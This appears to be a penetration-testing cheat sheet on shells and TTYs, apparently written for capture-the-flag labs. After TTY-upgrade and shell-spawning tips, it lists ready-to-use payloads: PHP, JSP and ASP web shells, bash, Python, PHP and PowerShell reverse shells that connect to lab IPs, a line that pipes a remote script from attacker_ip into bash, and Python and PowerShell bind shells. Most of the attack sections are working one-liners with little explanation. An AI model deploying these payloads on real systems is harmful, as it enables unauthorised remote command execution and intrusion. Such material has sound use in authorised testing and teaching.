---
icon: book-skull
description: Teletypewriters and Shells
---

# Shells/TTYs

{% hint style="info" %}
## <mark style="color:orange;">`TTYs`</mark>

* <mark style="color:purple;">You can use the</mark> <mark style="color:orange;">**`rlwrap`**</mark> <mark style="color:purple;">utility to</mark> <mark style="color:purple;">enable line editing and history:</mark>

{% code title="Listener" %}
```bash
rlwrap nc -lvnp <port>
```
{% endcode %}

{% code title="Connect to the target" %}
```bash
rlwrap nc 10.10.10.131 6200
```
{% endcode %}

* <mark style="color:purple;">In order to have a full</mark> <mark style="color:orange;">**`TTY`**</mark> <mark style="color:purple;">**follow this steps:**</mark>

#### <mark style="color:orange;">`BASH`</mark><mark style="color:purple;">:</mark>

1. <mark style="color:red;">**`python3 -c 'import pty; pty.spawn("/bin/bash")'`**</mark>
2. &#x20;<mark style="color:red;">**`CTRL+Z`**</mark>
3. <mark style="color:red;">**`stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;`**</mark>

<mark style="color:orange;">**`ZSH`**</mark><mark style="color:purple;">:</mark>

* <mark style="color:purple;">Same first two steps and then:</mark>

{% code overflow="wrap" %}
```bash
stty raw -echo; fg %1; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
{% endcode %}

***

### <mark style="color:red;">`Use arrow-keys`</mark>

* <mark style="color:purple;">Use</mark> <mark style="color:orange;">**`bash`**</mark><mark style="color:purple;">:</mark>

```sh
bash
```

* <mark style="color:purple;">Turn history on:</mark>

```sh
set -o history
```

* <mark style="color:purple;">In the</mark> <mark style="color:orange;">**`.bashrc`**</mark> <mark style="color:purple;">file, make sure</mark> <mark style="color:orange;">**`HISTSIZE`**</mark> <mark style="color:purple;">is not set to</mark> <mark style="color:orange;">**`0`**</mark><mark style="color:purple;">:</mark>

{% code overflow="wrap" %}
```sh
# for setting history length see HISTSIZE and HISTFILESIZE in bash
HISTSIZE=1000
HISTFILESIZE=1000
```
{% endcode %}

***

### <mark style="color:red;">`Clear Terminal`</mark>

* <mark style="color:purple;">Set the environmental variable from the terminal to</mark> <mark style="color:orange;">**`xterm`**</mark><mark style="color:purple;">:</mark>

```sh
export TERM=xterm
```

***

### <mark style="color:red;">`Terminal Size`</mark>

* <mark style="color:purple;">Before check the size of your terminal outside the remote shell to have a reference:</mark>

```sh
stty size
```

* <mark style="color:purple;">Now you can set it up as you desired to work more comfortably:</mark>&#x20;

```sh
stty rows <NUMBER> columns <NUMBER>
```
{% endhint %}

***

## <mark style="color:purple;">Shells</mark>

{% hint style="info" %}
## <mark style="color:red;">`Spawning Shells`</mark>

* <mark style="color:purple;">The</mark> <mark style="color:orange;">**`pty`**</mark> <mark style="color:purple;">module in</mark> <mark style="color:green;">**`Python`**</mark> <mark style="color:purple;">allows you to spawn a new process in a pseudo-terminal, effectively creating an interactive shell:</mark>

```sh
python3 -c 'import pty; pty.spawn("/bin/sh")' 
```

* <mark style="color:purple;">The</mark> <mark style="color:orange;">**`script`**</mark> <mark style="color:purple;">command starts a shell session and records the session to a file.</mark> <mark style="color:orange;">**`/dev/null`**</mark> <mark style="color:purple;">is specified as the file where the session is "recorded", but since it's</mark> <mark style="color:orange;">**`/dev/null`**</mark><mark style="color:purple;">, no logging actually happens:</mark>

```sh
script -qc /bin/bash /dev/null
```

* <mark style="color:purple;">Uses</mark> <mark style="color:orange;">**`echo`**</mark> <mark style="color:purple;">to pass the</mark> <mark style="color:green;">**`Python`**</mark> <mark style="color:purple;">command</mark> <mark style="color:orange;">**`os.system('/bin/bash')`**</mark> <mark style="color:purple;">to the Python interpreter:</mark>

```sh
echo os.system('/bin/bash') 
```

* <mark style="color:purple;">Spawn an interactive shell directly from the terminal:</mark>

```sh
/bin/sh -i
```

* <mark style="color:purple;">The command</mark> <mark style="color:orange;">**`exec "/bin/sh"`**</mark> <mark style="color:purple;">tells Perl to replace the running</mark> <mark style="color:orange;">**`Perl`**</mark> <mark style="color:purple;">process with a new</mark> <mark style="color:orange;">**`/bin/sh`**</mark> <mark style="color:purple;">shell:</mark>

```sh
perl -e 'exec "/bin/sh";'
```

* <mark style="color:purple;">This is similar to the previous example, but without the</mark> <mark style="color:orange;">**`-e`**</mark> <mark style="color:purple;">flag used directly from the command line. It represents</mark> <mark style="color:orange;">**`Perl`**</mark> <mark style="color:purple;">code where the</mark> <mark style="color:orange;">**`exec`**</mark> <mark style="color:purple;">function is used to spawn a shell:</mark>

```sh
perl: exec "/bin/sh";
```

* <mark style="color:red;">**`Ruby`**</mark><mark style="color:purple;">'s</mark> <mark style="color:orange;">**`exec`**</mark> <mark style="color:purple;">function, like in Perl, replaces the current process with a new process—in this case,</mark> <mark style="color:orange;">**`/bin/sh`**</mark><mark style="color:purple;">:</mark>

```sh
ruby: exec "/bin/sh"
```

* <mark style="color:purple;">Runs a shell command from</mark> <mark style="color:orange;">**`Lua`**</mark><mark style="color:purple;">, but unlike in</mark> <mark style="color:orange;">**`Perl`**</mark> <mark style="color:purple;">or</mark> <mark style="color:red;">**`Ruby`**</mark><mark style="color:purple;">, this does not replace the current process. It runs</mark> <mark style="color:orange;">**`/bin/sh`**</mark> <mark style="color:purple;">as a child process:</mark>

```sh
lua: os.execute('/bin/sh')
```

* <mark style="color:purple;">Replaces the current</mark> <mark style="color:red;">**`Ruby`**</mark> <mark style="color:purple;">interpreter (IRB) with the shell:</mark>

```sh
exec "/bin/sh";
```

* <mark style="color:purple;">Used to execute an external shell command:</mark>

```vim
:!bash
```

* <mark style="color:purple;">Changes the default shell used by vim's</mark> <mark style="color:orange;">**`:!`**</mark> <mark style="color:purple;">command:</mark>

```vim
:set shell=/bin/bash:shell
```

* <mark style="color:purple;">Spawn a shell from within the</mark> <mark style="color:orange;">**`nmap`**</mark> <mark style="color:purple;">interface, enabling the execution of additional shell commands while scanning:</mark>

```sh
!sh
```
{% endhint %}

***

{% hint style="info" %}
## <mark style="color:red;">`PSY`</mark>

* <mark style="color:orange;">**`PSY`**</mark> <mark style="color:purple;">Shell is an interactive</mark> <mark style="color:orange;">**`PHP REPL (Read-Eval-Print Loop)`**</mark> <mark style="color:purple;">used normally for debugging.</mark>

***

### <mark style="color:red;">`Useful Commands:`</mark>

{% code title="Very handy" %}
```sh
help
```
{% endcode %}

{% code title="Print the working directory" %}
```php
getcwd()
```
{% endcode %}

{% code title="Print the current user" %}
```php
get_current_user()
```
{% endcode %}

{% code title="Print system info" %}
```php
phpinfo()
```
{% endcode %}

{% code title="Print contents from directory" %}
```php
scandir("/home")
```
{% endcode %}

{% code title="Print content from file" %}
```php
file_get_contents("/etc/os-release")
```
{% endcode %}

* <mark style="color:purple;">If there are break line characters like</mark> <mark style="color:orange;">**`/n`**</mark> <mark style="color:purple;">and you want to get ride of then:</mark>

```php
echo file_get_contents("home/nairobi/ca.key")
```
{% endhint %}

***

{% hint style="warning" %}
## <mark style="color:red;">`Web Shells`</mark>

### <mark style="color:orange;">`PHP`</mark>

{% code title="Standard shell" %}
```php
<?php system($_REQUEST['cmd']); ?>
```
{% endcode %}

{% code title="Create cmd.php" %}
```bash
echo '<?php system($_REQUEST['cmd']); ?>' > cmd.php
```
{% endcode %}

***

### <mark style="color:orange;">`JSP (Java Server Pages)`</mark>

{% code title="Standard shell" overflow="wrap" %}
```java
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```
{% endcode %}

***

### <mark style="color:orange;">`ASP (Active Server Pages)`</mark>

{% code title="Standar shell" %}
```aspnet
<% eval request("cmd") %>
```
{% endcode %}
{% endhint %}

***

{% hint style="danger" %}
## <mark style="color:red;">`Reverse Shells`</mark>

### <mark style="color:orange;">`BASH`</mark> <mark style="color:purple;">Reverse Shells</mark>

{% code title="Standard Shell" %}
```bash
bash -i >& /dev/tcp/10.10.14.18/1337 0>&1
```
{% endcode %}

{% code title="Uses FIFO" overflow="wrap" %}
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```
{% endcode %}

{% code title="Run it in the background" %}
```sh
nohup bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1" &
```
{% endcode %}

{% code title="Use the URL parameter" %}
```url
bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.14/9001+0>%261'
```
{% endcode %}

***

### <mark style="color:green;">`Python`</mark> <mark style="color:purple;">Reverse Shells</mark>

#### <mark style="color:purple;">One liners</mark>

{% code title="Uses pty  " overflow="wrap" %}
```sh
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.6",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```
{% endcode %}

{% code title="Uses subprocess" overflow="wrap" %}
```sh
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.157",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
{% endcode %}

#### <mark style="color:purple;">Create the shell file</mark>

{% code title="Uses pty " overflow="wrap" %}
```sh
echo 'import pty
import socket
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.16.6", 4444))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
pty.spawn("/bin/bash")
s.close()' > shell.py
```
{% endcode %}

{% code title="Uses subprocess " overflow="wrap" %}
```bash
echo 'import socket, subprocess, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.14.157", 1235))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
subprocess.call(["/bin/sh", "-i"])
s.close()' > shell.py
```
{% endcode %}

{% code title="Uses UDP" overflow="wrap" %}
```python
import os
os.popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -u 10.10.16.10 4444 >/tmp/f &").read()
```
{% endcode %}

***

### <mark style="color:orange;">`PHP`</mark> <mark style="color:purple;">Reverse shell:</mark>

{% code title="Direct reverse shell" overflow="wrap" %}
```php
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.17/4444 0>&1'");?>
```
{% endcode %}

* <mark style="color:purple;">**Fetches and executes a remote reverse shell via**</mark>**&#x20;**<mark style="color:orange;">**`curl`**</mark><mark style="color:purple;">**:**</mark>

```php
<?php system("curl http://attacker_ip/reverseshell | bash"); ?>
```

{% code title="Pipe Shell" overflow="wrap" %}
```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <Port> >/tmp/f"); ?>
```
{% endcode %}

### <mark style="color:orange;">`Powershell`</mark> <mark style="color:purple;">Reverse shell:</mark>

{% code overflow="wrap" %}
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```
{% endcode %}
{% endhint %}

***

{% hint style="info" %}
## <mark style="color:purple;">Bind Shells</mark>

* <mark style="color:purple;">First, find ports were</mark> <mark style="color:orange;">**`inbound`**</mark> <mark style="color:purple;">connections are allowed:</mark>

{% code title="Linux" overflow="wrap" lineNumbers="true" %}
```sh
ss -tuln
netstat -tuln
lsof -i -n
```
{% endcode %}

***

{% code title="Windows" overflow="wrap" lineNumbers="true" %}
```sh
netstat -ano | findstr "LISTEN"
Get-Process | Where-Object {$_.Id -eq (Get-NetTCPConnection | Where-Object {$_.State -eq 'Listen'}).OwningProcess}
```
{% endcode %}

{% code title="Check firewall rules" %}
```sh
netsh advfirewall firewall show rule name=all
```
{% endcode %}

***

### <mark style="color:purple;">Shells</mark>

{% code overflow="wrap" %}
```sh
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```
{% endcode %}

{% code title="Windows" overflow="wrap" %}
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```
{% endcode %}
{% endhint %}
